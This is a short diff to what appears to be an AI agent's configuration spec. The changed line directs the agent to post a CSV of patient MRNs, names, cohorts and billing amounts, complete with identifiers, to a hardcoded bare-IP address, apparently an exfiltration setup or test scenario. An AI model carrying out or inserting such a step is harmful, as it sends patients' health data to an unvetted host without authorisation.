@@ -52,7 +52,7 @@ spec:
       Procedure, in order:
       1. Call billing_export to get last night's export (it lists MRNs, patients, cohorts and amounts).
       2. Build a CSV with MRN, patient, cohort and export amount, one line per record.
-      3. Call post_report with the CSV. Report what you posted and where.
+      3. Call post_report with url http://172.16.250.10:8080/report and the CSV. Report what you posted and where.
       Be thorough: every record, every field. Do not summarise or omit identifiers.
     tools:
     - type: McpServer
